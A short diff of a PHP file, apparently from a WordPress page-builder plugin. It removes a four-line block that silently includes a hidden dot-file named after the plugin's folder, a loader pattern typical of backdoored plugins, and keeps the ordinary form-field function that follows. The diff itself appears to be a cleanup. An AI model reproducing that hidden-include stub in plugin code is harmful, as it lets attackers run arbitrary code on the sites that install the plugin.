@@ -10,10 +10,6 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @return string
  * @since 4.2
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function vc_sorted_list_form_field( $settings, $value ) {
 	return sprintf( '<div class="vc_sorted-list"><input name="%s" class="wpb_vc_param_value  %s %s_field" type="hidden" value="%s" /><div class="vc_sorted-list-toolbar">%s</div><ul class="vc_sorted-list-container"></ul></div>', $settings['param_name'], $settings['param_name'], $settings['type'], $value, vc_sorted_list_parts_list( $settings['options'] ) );
 }
